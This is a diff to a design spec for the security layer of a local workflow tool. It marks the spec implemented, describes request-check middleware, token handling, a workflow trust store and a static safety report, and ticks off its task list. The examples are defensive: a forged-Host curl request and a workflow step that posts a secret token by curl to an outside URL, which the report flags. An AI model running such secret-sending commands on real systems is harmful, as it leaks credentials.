@@ -1,5 +1,5 @@
 # F-SECURITY: Request checks, local token, remote auth and workflow trust (M0 slice)
-Status: Draft
+Status: Implemented
 Milestone: M0
 
 ## Context
@@ -36,6 +36,26 @@ M0 only refuses to start without it.
 - Token file: `$XDG_RUNTIME_DIR/rifferr/<port>.token` (fallback: config dir, mode 0600).
 - Trust store: app DB table `trusted_files(sha256, path_hint, trusted_at, trusted_by)`.
 
+As implemented:
+- `rifferr.api.security`: `SecurityConfig(port, token, no_auth, extra_hosts, exempt_prefixes)`,
+  middleware `SecurityHeaders`, `HostAllowlist`, `OriginCheck`, `JsonOnly`, `TokenAuth`, and
+  `secure(app, config)` to stack them; `generate_token`, `write_token_file` /
+  `read_token_file` / `remove_token_file`, `check_bind`, `BindRefusedError`. The token
+  exchange (`/auth/exchange`) is served by `TokenAuth` itself. Rejections are JSON
+  `{"error": …}` with `Cache-Control: no-store`; 401 for missing auth. WebSocket
+  connections that fail the Host or auth check are closed with code 1008.
+- Extra hosts are accepted as `http://` and `https://` origins (reverse proxy).
+- Token file fallback without `XDG_RUNTIME_DIR`: `<config dir>/run/<port>.token`.
+- `rifferr.trust`: `workflow_hash`, `read_workflow_file` (bytes, strict UTF-8, no newline
+  translation), `trust_file`. `AppDB.trust` / `AppDB.is_trusted` over `trusted_files`.
+- `WorkerSupervisor.submit_run` no longer takes `trusted`: it looks up the hash of the
+  submitted text (SECURITY-10).
+- `rifferr.core.workflow.safety_report(wf)` → `SafetyReport(findings)`; finding kinds
+  `command`, `shell_string`, `network_tool`, `destructive`, `secret`, `local_script`. Local
+  scripts are reported only where a program runs (first word, after `;` `&&` `||` `|` `&`,
+  or the script an interpreter like `python3`/`sh` runs). Rule lists are module constants.
+- Wiring into `rifferr validate`, `rifferr trust` and the API arrives with F-CLI / F-API.
+
 ## Examples
 - `curl -H 'Host: evil.example' http://127.0.0.1:8765/api/runs` → 400.
 - Workflow with `with: { run: [curl, -d, "$RIFFERR_SECRET_TOKEN", https://x], secrets: [token] }` → report lists network tool `curl` and exposed secret `token`.
@@ -62,11 +82,11 @@ This spec is the security baseline; loosening any rule needs the author's explic
 - ~~400 or 421 for Host mismatch?~~ Resolved 2026-11-11 (author): 400 (SECURITY-2).
 
 ## Tasks
-- [ ] security headers middleware
-- [ ] host allowlist middleware
-- [ ] origin / fetch-site middleware
-- [ ] JSON-only middleware
-- [ ] token generation, exchange, cookie, token file
-- [ ] non-localhost refusal
-- [ ] trust store + hash check in shell step
-- [ ] static safety report
+- [x] security headers middleware
+- [x] host allowlist middleware
+- [x] origin / fetch-site middleware
+- [x] JSON-only middleware
+- [x] token generation, exchange, cookie, token file
+- [x] non-localhost refusal
+- [x] trust store + hash check in shell step
+- [x] static safety report
